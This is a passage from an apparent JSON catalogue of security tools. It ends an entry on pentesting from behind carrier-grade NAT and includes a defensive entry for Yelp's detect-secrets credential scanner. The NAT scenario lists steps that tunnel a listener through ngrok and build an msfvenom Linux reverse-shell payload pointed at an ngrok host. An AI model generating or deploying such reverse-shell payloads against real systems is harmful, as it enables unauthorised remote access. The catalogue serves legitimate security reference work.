                "description": "Pentesting from behind a carrier-grade NAT where direct inbound ports are blocked. Expose listener via Ngrok.",
                "steps": [
                    "Start TCP tunnel: ngrok tcp 4444",
                    "Note assigned public host and port: 0.tcp.ngrok.io:12345",
                    "Generate payload targeting ngrok endpoint: msfvenom -p linux/x64/shell_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f elf -o shell.elf"
                ]
            }
        ],
        "learning_refs": [
            {"title": "Ngrok Documentation", "url": "https://ngrok.com/docs/", "type": "doc"}
        ]
    },
    {
        "name": "detect-secrets",
        "display_name": "Detect-Secrets (Credential Leak Scanner)",
        "category": "Forensics",
        "subcategory": "Secret & Token Scanner",
        "description": "Enterprise secret baseline and credential scanning tool by Yelp. Scans git repositories and source code for committed API keys, private keys, AWS tokens, and high-entropy secrets.",
        "package_name": "detect-secrets",
        "install_source": "Pipx / Python",
        "binary_names": ["detect-secrets"],
        "install_command": "pipx install detect-secrets",
        "mitre_tactics": ["Credential Access", "Discovery"],
        "mitre_techniques": ["T1552.001 - Credentials In Files"],
        "syntax_examples": [
            {"cmd": "detect-secrets scan --all-files > .secrets.baseline", "desc": "Scan repository and generate baseline of all detected secrets."},
            {"cmd": "detect-secrets audit .secrets.baseline", "desc": "Interactively triage and label detected secrets."}
        ],
        "scenarios": [
            {
                "title": "Pre-Commit Codebase Secret Auditing",
                "incident_type": "DevSecOps / Source Code Review",
                "description": "Audit client application source code before production release to verify developers didn't commit database passwords or private JWT signing keys.",
                "steps": [
                    "Run scan across source tree: detect-secrets scan src/ > baseline.json",
                    "Flag high-entropy string findings for rotation."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Detect-Secrets GitHub", "url": "https://github.com/Yelp/detect-secrets", "type": "doc"}
        ]
    }
]
